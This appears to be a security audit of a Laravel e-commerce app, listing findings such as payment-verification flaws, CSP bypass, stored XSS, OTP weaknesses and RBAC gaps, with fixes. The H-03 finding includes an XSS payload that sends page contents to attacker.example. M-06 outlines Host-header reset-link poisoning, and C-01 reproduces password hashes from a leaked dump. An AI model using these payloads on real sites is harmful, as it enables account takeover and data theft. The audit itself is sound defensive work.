# Security & Bug Audit — Nex-on (Laravel 12 E-Commerce)

**Audit date:** 17 November 2026 (working-tree re-check)
**Target:** `C:\DevForge\projects\Nexon`
**Scope:** routes, controllers, middleware, models, services, views, config, seeders, migrations, public assets, dotfiles, deployment scripts, git history.
**Basis:** every item below was reproduced in the **current working tree** (including uncommitted changes). Previously fixed items and items that could not be reproduced were removed.

**Severity legend:** Critical = full compromise / mass data exposure · High = privilege escalation, payment fraud, account takeover · Medium = serious integrity/availability issue or defence-in-depth failure · Low = hardening / operational bug.

**Summary:** 22 findings — 1 Critical, 8 High, 9 Medium, 4 Low. (M-09 is a Low-severity functional bug that keeps its M-series ID so cross-references stay stable.)

| ID | Severity | Finding | OWASP 2021 | CWE |
|---|---|---|---|---|
| C-01 | Critical | Production DB dump still recoverable from git history (bcrypt hashes, admin/staff accounts, customer PII) | A02, A07 | CWE-538, CWE-312 |
| H-01 | High | Payment verification/webhooks never bind the payment to the order amount, currency or a unique payment ID → one payment can mark multiple/higher-value orders paid | A04, A08 | CWE-345, CWE-840 |
| H-02 | High | CSP is nullified: middleware injects the valid nonce into *every* `<script>` tag and executes `on*` attributes through `new Function`, with `'unsafe-eval'` enabled | A03, A05 | CWE-693, CWE-79 |
| H-03 | High | Stored XSS in storefront quick-view (Saaya + Lumiere) via unescaped product colour name / variant size in HTML/JS template literals | A03 | CWE-79 |
| H-04 | High | OTP/2FA weaknesses: `admin:otp` prints live admin OTP, OTP stored in plaintext and compared non-constant-time, no attempt lock on DB level | A07 | CWE-798, CWE-256, CWE-208 |
| H-05 | High | 2FA secret + QR + recovery codes rendered on every profile view; 2FA can be re-enrolled and recovery codes regenerated without the account password | A01, A07 | CWE-522, CWE-620 |
| H-06 | High | Over-broad RBAC: `settings.manage` grants customer PII and customer password reset (account takeover); `roles.manage` grants payroll/bank files | A01 | CWE-269, CWE-732 |
| H-07 | High | POS shift tampering and receipt IDOR: any `pos.access` user can read/close another cashier's shift and view any order receipt | A01 | CWE-639, CWE-862 |
| H-08 | High | Checkout never collects online payment; PayPal is configurable but has no handler — online orders remain unpaid/unconfirmed | A04 | CWE-840, CWE-696 |
| M-01 | Medium | Stripe webhook has no timestamp tolerance (replay window unbounded) | A08 | CWE-294 |
| M-02 | Medium | Order `status` / `payment_status` accept arbitrary strings; admin cancel does not restock | A04 | CWE-20, CWE-840 |
| M-03 | Medium | Cancellation restocks twice (auto-restock on request + restock on admin approval) | A04 | CWE-799, CWE-841 |
| M-04 | Medium | `/admin/orders/export` is shadowed by `/admin/orders/{order}` → export permanently 404s | A04 | CWE-706 |
| M-05 | Medium | Unauthenticated SMS OTP endpoint allows SMS bombing / toll fraud; OTP echoed in non-production environments | A04, A07 | CWE-770, CWE-799 |
| M-06 | Medium | No `TrustHosts`; password-reset URL is generated from the request Host header → reset-link poisoning | A05, A07 | CWE-644, CWE-640 |
| M-07 | Medium | POS discount is client-supplied and only capped at subtotal → cashier can zero out any sale with no approval/audit | A04 | CWE-840 |
| M-08 | Medium | Row-Level Security global scope is bypassed by ungrouped `orWhere()` in several queries (currently masked by manual checks) | A01 | CWE-863 |
| M-09 | Low | `saveAddress` accepts a client-supplied `id` in the `updateOrCreate` key → 500/duplicate-key or arbitrary PK creation | A04 | CWE-20, CWE-639 |
| M-10 | Medium | `EnsurePlatformBranding` silently rewrites every HTML response and force-reinjects attribution (unauthorised response tampering) | A08, A05 | CWE-829, CWE-693 |
| L-01 | Low | Third-party CDN scripts loaded without Subresource Integrity (SRI) | A05, A08 | CWE-829, CWE-353 |
| L-02 | Low | No email-verification enforcement (User does not implement `MustVerifyEmail`); unverified accounts can log in, order and change email | A07 | CWE-620 |
| L-03 | Low | Upload/root hardening is Apache `.htaccess` only; no equivalent for Nginx deployments | A05 | CWE-16 |

---

# 1. Detailed findings

## C-01 — Production database dump remains in git history

**Severity:** Critical (data exposure) · **OWASP:** A02 Cryptographic Failures, A07 Identification & Authentication Failures · **CWE:** CWE-538 (file/directory information exposure), CWE-312 (cleartext storage of sensitive information)

**Locations**

- `database/nexon_db_backup.sql` — deleted in commit `e941c47`, **not present in HEAD**, but fully recoverable from history:
  - `5713fcb` — `chore(db): refresh database backup snapshot`
  - `37a36de` — `Update database backup snapshot`
  - `8160f63` — `Include nexon_db_backup.sql database snapshot for v0.08 release`
- `.gitignore` now contains `*.sql`, which prevents *new* dumps but does not remove the old blob.

**Definition**
A mysqldump of the production database was committed to the repository. Deleting the file in a later commit does not delete the object: anyone with clone/fork/history access can run `git show 5713fcb:database/nexon_db_backup.sql`.

**Evidence**

```
$ git log --all --oneline -- database/nexon_db_backup.sql
e941c47 Release v0.09: ... (deletion)
5713fcb chore(db): refresh database backup snapshot
37a36de Update database backup snapshot
8160f63 Include nexon_db_backup.sql database snapshot for v0.08 release

$ git show 5713fcb:database/nexon_db_backup.sql | Select-Object -First 8
-- MySQL dump 10.13  Distrib 8.4.3, for Win64 (x86_64)
-- Host: localhost    Database: nexon_db
...

INSERT INTO `users` VALUES
(11,'Priya Sharma','priya.sharma@example.com',...,'$2y$12$n5212N8EzJVJyO1SFWwd0uVTjw0QOCLU9AFaMUapyy.f8.AquQnZi',...,'customer',...),
(12,'Robert Hayes','r.hayes@store.com','+1 555-1001',...,'$2y$12$vNOdYboKQMfutAHzVduzvOWx/7JzbKwfzIYB/yxxUsfWlsUS0urgK',...,'admin','Warehouse Manager',...),
(13,'Jessica Lee','j.lee@store.com',...,'$2y$12$xUhc//OpiBgHAYEXSUpQQOEmJhHMU8ztXhxr9tz45nBZ5JJG7m7ze',...)
```

The dump contains bcrypt password hashes (cost 12), role flags (`admin`, `is_staff`), e-mail addresses, phone numbers, and order/customer data.

**Impact**

- Offline password cracking of admin/staff/customer accounts; hash reuse against other services.
- Full customer PII exposure (names, e-mails, phones, addresses, order history).
- Physical addresses + phone numbers enable phishing, harassment and account-recovery attacks.
- Because staff/admin password hashes are included, an attacker who cracks one can log into the live admin panel if the password was not rotated.

**Remediation**

1. Rewrite history, not just delete the file:
   ```bash
   git filter-repo --path database/nexon_db_backup.sql --invert-paths
   # or: java -jar bfg.jar --delete-files nexon_db_backup.sql
   git push --force --all && git push --force --tags
   ```
2. Invalidate every credential present in the dump: force password reset for all users, rotate admin/staff passwords, rotate DB credentials, gateway keys, SMS tokens and `APP_KEY` if it was ever in a dump.
3. Purge all clones/forks/CI caches and ask collaborators to re-clone.
4. Add a pre-commit secret/dump scanner (gitleaks / trufflehog) and keep `*.sql` ignored.
5. Treat the exposed data as a breach: assess notification obligations.

---

## H-01 — Payment verification is not bound to order amount, currency or a unique payment ID

**Severity:** High · **OWASP:** A04 Insecure Design, A08 Software & Data Integrity Failures · **CWE:** CWE-345 (insufficient verification of data authenticity), CWE-840 (business logic errors)

**Locations**

- `app/Http/Controllers/PaymentWebhookController.php`
  - `verifyRazorpayClientPayment()` — lines **190–239** (public route `/api/payment/razorpay/verify`, `routes/web.php:189`)
  - `handleRazorpay()` — lines **42–63**
  - `handleStripe()` — lines **113–133**
  - `handlePhonePe()` — lines **170–182**
- `app/Providers/AppServiceProvider.php` — `payment_verify` limiter (15/min/IP), lines 159–161
- `app/Models/Order.php` — has `total`, `payment_reference`; no uniqueness constraint enforced in code

**Definition**
Every payment-confirmation path verifies the gateway signature correctly, but then marks an internal order as paid based **only on an order reference supplied in the payload/notes**. The verified amount, currency and the gateway's own order identifier are never compared with the internal order:

```php
// verifyRazorpayClientPayment(), lines 207-231
$expectedSignature = hash_hmac('sha256',
    $validated['razorpay_order_id'] . '|' . $validated['razorpay_payment_id'],
    $keySecret
);
if (!hash_equals($expectedSignature, $validated['razorpay_signature'])) { ... }

// NOTE: no check that razorpay_order_id belongs to this order,
//       no amount/currency comparison, no uniqueness on payment_reference.
$order = Order::where('reference', $validated['order_reference'])->firstOrFail();
...
$order->update([
    'payment_status'    => Order::PAYMENT_PAID,
    'payment_reference' => $validated['razorpay_payment_id'],
    'status'            => Order::STATUS_CONFIRMED,
]);
```

`handleRazorpay()` takes `order_reference` from `payload.payment.entity.notes` **or** `description` and marks the order paid without reading `payload.payment.entity.amount` or `currency` (`:42–63`). `handleStripe()` does the same with `metadata.order_reference` (`:113–133`). `handlePhonePe()` matches `merchantTransactionId` against either `reference` or `payment_reference` and ignores the amount (`:170–182`).

**Impact**

- A genuine ₹1 Razorpay payment (or one legitimate payment pair) can be replayed against a ₹50,000 order owned by the same session: the signature is valid, the amount is never checked.
- `payment_reference` is not unique, so the same gateway payment ID can be posted to multiple orders and mark all of them paid.
- A captured webhook (proxy, log, APM, misconfigured CDN) can be replayed later; there is no idempotency store or event ID dedupe.
- The `exists:orders,reference` validation on the public verify endpoint also acts as an order-reference oracle (valid/invalid error difference).

**Remediation**

1. Persist a `payment_intent` / `gateway_order_id` row when the order is created (`orders.gateway_order_id`, `orders.amount_due`, `orders.currency`).
2. On every confirmation: verify `gateway_order_id` belongs to the order, compare `amount` and `currency`, and reject mismatches.
3. Add a unique index on `payment_reference` (and store the gateway event ID with a unique index) so one payment can confirm one order only.
4. Enforce idempotency per gateway event; return 200 for duplicates without state change.
5. Remove `exists:orders,reference` from public validation; resolve the order from the authenticated session/ownership first.
6. Log amount mismatches as security events.

---

## H-02 — Content-Security-Policy is effectively disabled by the middleware

**Severity:** High · **OWASP:** A03 Injection, A05 Security Misconfiguration · **CWE:** CWE-693 (protection mechanism failure), CWE-79 (XSS)

**Locations**

- `app/Http/Middleware/SecurityHeadersMiddleware.php`
  - CSP string with `'unsafe-eval'` — lines **43–54**
  - Nonce injection into every `<script>` + `on*` → `data-on*` rewrite — lines **64–79**
- `resources/views/components/storefront-layout.blade.php` — delegated dispatcher using `new Function` — lines **381–417**
- `resources/views/admin/layout.blade.php` — same dispatcher — lines **1698–1723**

**Definition**
The policy advertises a nonce-based strict CSP, but the middleware rewrites the response so that **any** `<script>` tag in the HTML receives the valid nonce:

```php
// SecurityHeadersMiddleware.php:69-71
$content = preg_replace_callback('/<script\b(?![^>]*\bnonce=)([^>]*)>/i',
    fn ($matches) => "<script nonce=\"{$nonce}\"{$matches[1]}>",
    $content
);

// :75 — inline handlers are turned into data-* attributes…
$content = preg_replace('/(<[a-zA-Z0-9\-]+[^>]*?)(?<![\w-])on(click|change|submit)\s*=/i',
    '$1data-on$2=', $content);

// …and later executed with eval-equivalent semantics:
// storefront-layout.blade.php:383-388
const handler = el.getAttribute('data-' + attrName) || el.getAttribute(attrName);
const fn = new Function('event', handler);
```

with `script-src ... 'strict-dynamic' 'unsafe-eval' ...` (`:45`).

**Impact**

- CSP provides **zero** mitigation for XSS: if attacker-controlled HTML reaches the response body (stored/reflected XSS, HTML injection in a template, a compromised CDN/extension writing markup), the middleware stamps a valid nonce onto the injected `<script>` and it executes.
- `'unsafe-eval'` is required for `new Function`, so `eval`, `Function`, and string-to-code execution are allowed after any injection.
- The `data-on*` rewrite plus dispatcher also re-enables inline-handler execution for any element that carries `data-onclick`/`onchange`/`onsubmit` — including markup produced by client-side `innerHTML` (see H-03).
- The policy therefore gives a false sense of protection in audits and reports.

**Remediation**

1. Do not mutate response bodies in security middleware. Render the nonce explicitly in Blade (`nonce="{{ $cspNonce }}"`) only on first-party script tags.
2. Remove the `on*` → `data-on*` rewrite and the `new Function` dispatcher; bind events with `addEventListener` in first-party JS.
3. Drop `'unsafe-eval'` (Alpine can be configured without it, or replace Alpine expression evaluation with explicit listeners).
4. Remove CDN origins allowed in `script-src`; self-host scripts and add SRI.
5. Add a CSP regression test that fails if `'unsafe-eval'`, `'unsafe-inline'`, or automatic nonce injection returns.

---

## H-03 — Stored XSS in storefront quick-view (Saaya and Lumiere)

**Severity:** High · **OWASP:** A03 Injection · **CWE:** CWE-79 (improper neutralisation of input during web page generation)

**Locations**

- `resources/views/storefront/saaya/partials/quick-view.blade.php` (new/untracked file, included through `components/storefront-layout.blade.php:288` via `@includeIf("storefront.{$theme->key}.partials.quick-view")`)
  - Colour swatches — lines **117–121**
  - Size buttons — lines **163–171**
- `resources/views/storefront/lumiere/partials/quick-view.blade.php` (tracked, live)
  - Colour swatches — lines **70–73**
  - Size buttons — lines **95–99**
- Data source: `app/Models/ProductColor.php::toPickerArray()` — returns `name`, `hex`, `size` **raw**
- Validation: `app/Http/Controllers/Admin/ProductController.php:123-129` — `colors.*.name` = `string|max:50`, `colors.*.hex` = `string|max:9` (no character whitelist), `colors.*.sizes.*.size` = `string|max:10`
- Execution: `storefront-layout.blade.php:383-405` delegated dispatcher (`getAttribute('data-onclick') || getAttribute('onclick')` → `new Function`)

**Definition**
Product colour and size values are interpolated into HTML/JS strings without escaping, then assigned through `innerHTML`:

```js
// Saaya quick-view, 117-121
colorsContainer.innerHTML = product.colors.map((c, i) => `
    <button ... title="${c.name}"
            ...
            style="background:${c.hex || '#ccc'}"></button>
`).join('');

// 163-171
sizeContainer.innerHTML = c.sizes.map(s => `
    <button ... onclick="qvSelectSize('${s.size}')" ...>
`).join('');
```

A product manager (or anyone with `products.manage`) can save a colour name containing an attribute break-out, for example:

```
" data-onclick="fetch('/profile').then(r=>r.text()).then(t=>fetch('https://attacker.example/?d='+btoa(t)))
```

(25 chars before the payload; the 50-char limit is enough for a compact payload). When a customer opens Quick View and clicks that swatch, the delegated dispatcher reads `data-onclick` and executes the code with `new Function` — permitted because of `'unsafe-eval'` (H-02).

Lumiere has the identical pattern in tracked code. `s.size` (10-char limit) is a smaller but still valid JS-string break-out on the same buttons.

**Impact**

- Stored XSS against every storefront visitor for the active theme.
- With `HttpOnly` session cookies the attacker cannot read the cookie directly, but can read the CSRF token, call same-origin APIs (change e-mail/password, address book, 2FA enrolment), exfiltrate page contents, and persist in the customer's session.
- Privilege escalation from a product-editor staff account to customer accounts and potentially to an admin who previews the storefront.

**Remediation**

1. Never build HTML with string interpolation from data. Build DOM nodes and assign `textContent` / `setAttribute` values.
2. If templates must stay, HTML-escape `name`, `hex` and `size` and JSON-escape values placed inside inline JS; better, use `data-*` attributes and `dataset`.
3. Validate `hex` with `regex:/^#[0-9a-fA-F]{3,8}$/` and `size` against the product's allowed size set server-side.
4. Remove the `new Function` dispatcher and inline handlers (see H-02).
5. Add CSP and XSS regression tests that inject quotes and `</button>` into colour/size fields.

---

## H-04 — OTP/2FA disclosure and weak OTP handling

**Severity:** High · **OWASP:** A07 Identification & Authentication Failures · **CWE:** CWE-798 (hard-coded/derivable credentials), CWE-256 (plaintext storage), CWE-208 (observable timing discrepancy)

**Locations**

- `app/Console/Commands/GetAdminOtpCommand.php` — lines **15**, **27–59**
- `app/Models/User.php` — `generateOtp()` / `verifyOtp()` — lines **91–114**
- `routes/auth.php` — OTP comparison — line **187**
- `database/migrations/2026_11_16_000001_expand_users_otp_code_column.php` (new migration confirms the column is plaintext `VARCHAR(100)`)

**Definition**

1. A first-class artisan command prints or **generates** a valid login OTP for any admin account:
   ```php
   protected $signature = 'admin:otp {email? : Optional admin email address}';
   ...
   if (empty($admin->otp_code) || expired) { $admin->generateOtp(10); ... }
   $this->line("  ⚡ OTP Code    : {$admin->otp_code}");
   ```
   Anyone with shell/CI/backup access (insiders, compromised host, leaked deployment token) can mint an admin second factor.
2. `User::generateOtp()` stores the code **in clear text** (`otp_code`) in the `users` table; the new migration only widens the column to `VARCHAR(100)`.
3. Verification uses loose, non-constant-time comparison:
   ```php
   // routes/auth.php:187
   if ($user->otp_code !== $request->otp) { ... }
   ```
   and `User::verifyOtp()` uses the same `!==` pattern.
4. `SmsService::verifyOtp()` also accepts a plaintext match (`orWhere('otp', $cleanOtp)`) alongside the SHA-256 hash — any legacy/plaintext row is accepted indefinitely (rows are never purged).

**Impact**

- A DB read (backup, SQLi, replica, log leak, support export) yields live admin OTPs for the 10-minute window — combined with a leaked password, that is full admin login.
- Timing side-channel on a 4–6 digit code is practical over a LAN/localhost and reduces the search space.
- The `admin:otp` command converts any host/CLI foothold into routine admin access and leaves no audit trail in the web logs.

**Remediation**

1. Delete `GetAdminOtpCommand` from production builds (or gate it behind an explicit `--force` + super-admin signature and log usage).
2. Store only a keyed hash (`Hash::make` or HMAC with `APP_KEY`) and compare with `hash_equals()`; never store or print the clear code.
3. Invalidate OTP on success, on password change, and after N failures; purge expired rows.
4. Remove the plaintext fallback in `SmsService::verifyOtp()`.
5. Rotate all admin credentials and force 2FA re-enrolment.

---

## H-05 — 2FA secret, QR and recovery codes exposed; 2FA can be replaced without a password

**Severity:** High · **OWASP:** A01 Broken Access Control, A07 Identification & Authentication Failures · **CWE:** CWE-522 (insufficiently protected credentials), CWE-620 (unverified password change)

**Locations**

- `app/Http/Controllers/ProfileController.php` — `edit()` lines **21–40**
- `resources/views/profile/partials/profile-content.blade.php` — lines **197–205** (QR + secret), **255** (recovery codes)
- `app/Http/Controllers/Auth/TwoFactorAuthenticationController.php`
  - `store()` — lines **22–36** (re-enrol without password)
  - `regenerateRecoveryCodes()` — lines **112–135** (password only checked if supplied)
- `routes/auth.php` — lines **410–421** (routes are `auth` + throttle only, no `password.confirm`)

**Definition**
`ProfileController::edit()` decrypts and passes the live TOTP secret, QR code and recovery codes to the profile view whenever `two_factor_secret` is set — including when 2FA is already confirmed and active:

```php
$secretKey = decrypt($user->two_factor_secret);
$qrCodeSvgUrl = $totp->getQrCodeSvgUrl(..., $secretKey);
$recoveryCodes = $user->getRecoveryCodes();
```

`TwoFactorAuthenticationController::store()` replaces the user's 2FA secret and recovery codes with no password/2FA re-authentication:

```php
$user->forceFill([
    'two_factor_secret'         => encrypt($secret),
    'two_factor_recovery_codes' => encrypt(json_encode($recoveryCodes)),
    'two_factor_confirmed_at'   => null,
])->save();
```

`regenerateRecoveryCodes()` only verifies the password **if the field is present**:

```php
if ($user->hasTwoFactorEnabled() && $request->filled('password')) { ... }
```

**Impact**

- Any session hijack (XSS from H-03, shared device, stolen cookie) yields the permanent TOTP seed and recovery codes — the attacker can clone the authenticator and bypass 2FA forever, even after the victim changes the password.
- The attacker can also enrol their own authenticator without knowing the password and lock the real owner out.
- Recovery-code regeneration without a password allows silent persistence.

**Remediation**

1. Show the secret/QR only during initial enrolment (`two_factor_confirmed_at === null`); after confirmation show only “enabled” and a masked secret.
2. Require `password.confirm` (and optionally an existing TOTP code) for enabling, disabling, re-enrolling and regenerating recovery codes.
3. Invalidate the current session's other sessions on 2FA changes.
4. Store recovery codes hashed (as currently done with `hash_equals`) and rotate them on re-enrolment.

---

## H-06 — Over-broad RBAC exposes customer accounts and payroll data

**Severity:** High · **OWASP:** A01 Broken Access Control · **CWE:** CWE-269 (improper privilege management), CWE-732 (incorrect permission assignment)

**Locations**

- `routes/web.php` — `permission:settings.manage` group opens at line **403**; customer PII and password reset are inside it:
  - `/customers` — line **460**
  - `/customers/{customer}` — line **463**
  - `PATCH /customers/{customer}/toggle` — line **464**
  - **`POST /customers/{customer}/password`** — line **465**
- `app/Http/Controllers/Admin/AdminCustomerController.php` — `updatePassword()` lines **96–114** (sets any customer's password, then deletes their sessions)
- `routes/web.php` — `permission:roles.manage` group opens at line **500**; payroll/bank export inside it:
  - `hrm/payroll/*` — lines **509–519**
  - `/{payroll}/bank-file` — line **518**

**Definition**
The “store settings” permission also grants the entire customer directory, including the ability to reset any customer's password. The “manage roles” permission also grants HR payroll, payslip printing and bank-file export. There is no separation between content/configuration administration, customer support, and finance/HR.

**Impact**

- A settings/content operator can take over any customer account by resetting its password (the controller invalidates sessions, so the real owner is logged out — a clean takeover).
- Mass PII export (names, e-mails, phones, addresses, order history) by a non-support role.
- A role manager can download employee bank/payroll data (salary, account numbers), which is a serious privacy/finance breach.

**Remediation**

1. Create distinct permissions: `customers.view`, `customers.manage`, `customers.password.reset` (super-admin only or explicitly audited), `hrm.payroll.view`, `hrm.payroll.export`.
2. Require re-authentication and dual control (super-admin approval) for customer password resets.
3. Move `customers.*` under the support/orders domain, not `settings.manage`.
4. Log every password reset and bank export with actor, target and IP (already partially logged for resets — extend to exports).

---

## H-07 — POS shift tampering and receipt IDOR

**Severity:** High · **OWASP:** A01 Broken Access Control · **CWE:** CWE-639 (authorization bypass through user-controlled key), CWE-862 (missing authorization)

**Locations**

- `routes/web.php` — POS group `permission:pos.access`, lines **228–240**
- `app/Http/Controllers/Admin/AdminPosShiftController.php`
  - `show()` — lines **113–123**
  - `recordMovement()` — lines **128–149**
  - `closeShift()` — lines **154–171**
  - `printReport()` — lines **176+**
- `app/Http/Controllers/Admin/AdminPosController.php` — `receipt()` lines **368–382**
- `app/Models/PosShift.php` — `closeShift()` lines **130–141** (no status guard)

**Definition**
All shift actions are resolved through route-model binding with no ownership or state checks:

```php
public function recordMovement(Request $request, PosShift $shift): RedirectResponse
{
    $validated = $request->validate([...]);
    $shift->movements()->create([...]);      // any shift ID accepted
    $shift->recomputeLiveMetrics();
}

public function closeShift(Request $request, PosShift $shift): RedirectResponse
{
    ...
    $shift->closeShift($countedCash, $validated['notes'] ?? null); // no cashier check, no "already closed" guard
}
```

`receipt(Order $order)` returns any order's receipt (customer name/phone/address, items, totals) to any user holding `pos.access`.

**Impact**

- A cashier can inject cash-in/cash-out movements into another cashier's drawer and close their shift with a falsified counted amount, concealing shortages or framing a colleague.
- A closed shift can be closed again (overwriting `closed_at`, `counted_cash`, `cash_difference`), destroying the audit trail.
- Any POS user can enumerate order IDs and harvest customer PII from receipts.
- Undermines Tally/accounting reconciliation that relies on shift totals.

**Remediation**

1. Authorise: `abort_unless($shift->cashier_id === Auth::id() || Auth::user()->isSuperAdmin(), 403)`.
2. Reject any action when `$shift->status !== 'open'`; make `closeShift()` idempotent and atomic.
3. Scope `receipt()` to either POS-channel orders or orders the cashier created; add an explicit `orders.view`/`reports.view` check for non-POS orders.
4. Add an append-only shift-movement log with actor, IP and timestamps; never allow updates/deletes.
5. Add feature tests for cross-cashier 403s and double-close.

---

## H-08 — Checkout never collects online payment; PayPal has no handler

**Severity:** High (business / revenue) · **OWASP:** A04 Insecure Design · **CWE:** CWE-840 (business logic error), CWE-696 (incorrect behaviour order)

**Locations**

- `app/Http/Controllers/StorefrontController.php` — `placeOrder()` validation accepts `payment in:cod,upi,card`
- `app/Models/Order.php` — `createFromCheckout()` always writes `payment_status = PAYMENT_PENDING` (line ~349)
- `app/Http/Controllers/Admin/AdminPaymentGatewayController.php` — PayPal credentials configurable, lines **96–100**
- `routes/web.php` — only `webhook/razorpay`, `webhook/stripe`, `webhook/phonepe` exist (lines **186–190**); **no PayPal route/handler**
- Storefront checkouts (e.g. `resources/views/storefront/saaya/checkout.blade.php`) post `payment` directly; no Razorpay/Stripe/PhonePe JS is present anywhere in `resources/` or `public/`

**Definition**
The checkout form accepts “UPI/card”, but no gateway script, order-creation call, or callback is implemented. The order is created as `payment_pending`; the only code paths that can mark it paid are the webhook endpoints and `/api/payment/razorpay/verify`, none of which the storefront calls. PayPal is exposed in the admin gateway UI but has no route/controller branch at all.

**Impact**

- Online orders are accepted without payment collection and remain pending forever unless an administrator manually marks them paid.
- PayPal orders can never be confirmed (functional dead end).
- Customers see “order placed” for unpaid goods; fulfilment/stock is reserved with no money collected — direct revenue loss and disputes.
- Combined with H-01, the unused verify endpoint is a latent fraud vector as soon as a front-end is wired up.

**Remediation**

1. Implement the actual gateway flow: create a gateway order server-side, return the public key/order ID, open the hosted checkout, and confirm via signature + amount-bound server verification.
2. Add a PayPal order/capture + webhook handler, or remove PayPal from the UI until implemented.
3. Until gateways are live, disable `upi`/`card`/PayPal options and show only COD/manual bank transfer.
4. Add end-to-end tests for success, failure, cancellation, duplicate callback and amount mismatch.

---

## M-01 — Stripe webhook has no replay window

**Severity:** Medium · **OWASP:** A08 Software & Data Integrity Failures · **CWE:** CWE-294 (authentication bypass by capture-replay)

**Location:** `app/Http/Controllers/PaymentWebhookController.php:85-108`

**Definition**
The Stripe signature is computed over `"{timestamp}.{raw body}"` correctly, but the timestamp is never compared to the current time, so a captured signed payload is valid forever.

**Impact**
If an attacker obtains a valid signed webhook (proxy logs, APM, shared hosting logs, compromised CDN), they can replay it later — e.g. after an order was refunded/cancelled/reset — and re-mark it paid. No amount binding (H-01) makes this worse.

**Remediation**
Reject events whose `|now - t| > 300s` (Stripe's default tolerance). Store the event ID with a unique constraint for idempotency. Return 200 for duplicates without state changes.

---

## M-02 — Order status / payment status accept arbitrary values; admin cancel does not restock

**Severity:** Medium · **OWASP:** A04 Insecure Design · **CWE:** CWE-20 (improper input validation), CWE-840

**Location:** `app/Http/Controllers/Admin/AdminOrderController.php:85-132`

**Definition**

```php
$validated = $request->validate([
    'status'         => 'required|string',
    'payment_status' => 'nullable|string',
    ...
]);
$order->status = $validated['status'];
if (!empty($validated['payment_status'])) {
    $order->payment_status = $validated['payment_status'];
}
```

Any value can be written (`"paid"`, `"refunded"`, `"delivered"`, typos, arbitrary strings), bypassing the `Order::STATUS_*` / `PAYMENT_*` constants and all downstream logic. Setting `status = cancelled` here does **not** return stock to inventory (only the order-request flow restocks).

**Impact**

- Anyone with `orders.manage` can flip an unpaid order to `paid` or a delivered order to `pending`, corrupting finance/Tally exports.
- Unknown statuses break dashboards, filters, reports and customer tracking.
- Cancelled orders leave stock permanently deducted, causing phantom stock-outs.

**Remediation**
Use `Rule::in([...])` for both fields and a state-machine transition map (e.g. `pending → confirmed|cancelled`, `confirmed → processing|cancelled`, ...). On transition to `cancelled`, restock exactly once via a dedicated service with an idempotency flag. Reject invalid transitions with 422.

---

## M-03 — Double restock on cancellation

**Severity:** Medium · **OWASP:** A04 Insecure Design · **CWE:** CWE-799 (improper control of interaction frequency), CWE-841 (improper enforcement of behavioural workflow)

**Locations**

- `app/Http/Controllers/StorefrontController.php:731-743` — customer cancellation of a pending order auto-approves and restocks
- `app/Http/Controllers/Admin/AdminOrderRequestController.php:45-84` — admin approval of a cancel request restocks again, with no status/idempotency guard

**Definition**
`submitOrderRequest()` auto-approves and restocks a pending cancellation, setting the request to `APPROVED`. `AdminOrderRequestController::update()` accepts `action=approve` regardless of the request's current status, so a direct PATCH re-runs the restock loop for the same order.

**Impact**
Inventory inflation (stock added twice for one cancelled order), overstated availability, overselling and incorrect COGS/inventory valuation.

**Remediation**
Make cancellation a single idempotent service (`OrderCancellationService`) guarded by `order.status` and a `restocked_at`/`cancelled_at` marker inside a transaction. Reject approval of non-pending requests (`abort_unless($orderRequest->status === PENDING, 422)`).

---

## M-04 — `/admin/orders/export` is shadowed by `/admin/orders/{order}`

**Severity:** Medium (functional bug) · **OWASP:** A04 Insecure Design · **CWE:** CWE-706 (use of incorrectly resolved name/reference)

**Locations**

- `routes/web.php:345` — `GET /admin/orders/{order}` registered first
- `routes/web.php:366` — `GET /admin/orders/export` registered after it
- `app/Http/Controllers/Admin/AdminOrderController.php:178` — `exportCsv()` is therefore unreachable

**Definition**
Laravel matches routes in registration order. `GET /admin/orders/export` matches `/orders/{order}` with `$order = "export"`, route-model binding fails, and a 404 is returned. The export controller action can never be executed through HTTP.

**Impact**
Reported as a working feature, but CSV order export always 404s; staff cannot export orders (an operational/reporting gap). The controller and permission (`orders.export|orders.manage`) exist, creating a false expectation in audits.

**Remediation**
Register the static route before the parameterised route, or constrain the parameter (`->whereNumber('order')`). Add a route test asserting `GET /admin/orders/export` returns 200/streamed CSV.

---

## M-05 — Unauthenticated SMS OTP endpoint enables SMS bombing / toll fraud

**Severity:** Medium · **OWASP:** A04 Insecure Design, A07 Identification & Authentication Failures · **CWE:** CWE-770 (allocation of resources without limits), CWE-799

**Locations**

- `routes/web.php:193` — `POST /api/sms/send-otp`, middleware `throttle:sms_send`, **no `auth`**
- `app/Http/Controllers/Admin/AdminSmsController.php:122-148`
- `app/Providers/AppServiceProvider.php:119-123` — limiter keyed by `phone|IP`

**Definition**
The endpoint accepts any `phone` from any anonymous caller. The limiter key is `phone|IP`, so rotating the phone number (or the source IP via proxies) bypasses it. There is no global, per-account or per-prefix cap.

```php
$throttleKey = 'sms_otp_send:' . ($phone ?: 'anon') . '|' . $request->ip();
...
return response()->json([
    'success' => true,
    'otp'     => app()->environment('local','testing') ? ($res['otp'] ?? null) : null,
]);
```

**Impact**

- An attacker can send unlimited paid SMS to arbitrary numbers (harassment, SMS bombing, inflated gateway bills).
- If `APP_ENV` is ever `local`/`testing` in production, the API returns the OTP in JSON — complete phone-verification bypass and account/driver-login takeover.
- The same endpoint is used for driver login, so bombing can disrupt driver operations.

**Remediation**
Require authentication (or a signed/rate-limited checkout context) for OTP dispatch. Add per-IP and global daily caps in addition to per-phone; block repeated requests for the same number for 60s. Never return the OTP in any environment; log it only to a local-only channel behind an explicit debug flag.

---

## M-06 — Host-header injection in password-reset emails

**Severity:** Medium · **OWASP:** A05 Security Misconfiguration, A07 Identification & Authentication Failures · **CWE:** CWE-644 (improper neutralisation of HTTP headers), CWE-640 (weak password recovery)

**Locations**

- No `App\Http\Middleware\TrustHosts` and no `trusted_hosts` configuration (verified: `bootstrap/app.php`, `app/Http/Middleware`)
- `vendor/laravel/framework/.../Auth/Notifications/ResetPassword.php:96-99` — `url(route('password.reset', [...], false))`
- `routes/auth.php:360-367` — default `PasswordBroker::sendResetLink`

**Definition**
The reset URL is generated with `url()` inside the request, so its absolute host comes from the incoming `Host` header. Without a trusted-host allow-list, an attacker can trigger a reset for a victim's e-mail while sending `Host: attacker.example`; the victim receives a genuine e-mail whose link points at the attacker's domain with the valid reset token in the path.

**Impact**
One click on the e-mailed link leaks the reset token to the attacker, enabling account takeover. Also affects any other absolute URL generated during a request (verification, invoice links, webhooks with absolute URLs).

**Remediation**
Enable `TrustHosts` with an explicit allow-list (`APP_URL` host + real domains, `->allowsSubdomains()` only if needed) or configure the web server to reject unknown `Host` headers. Additionally force `URL::forceRootUrl(config('app.url'))` for auth notifications.

---

## M-07 — Unbounded POS discount allows till fraud

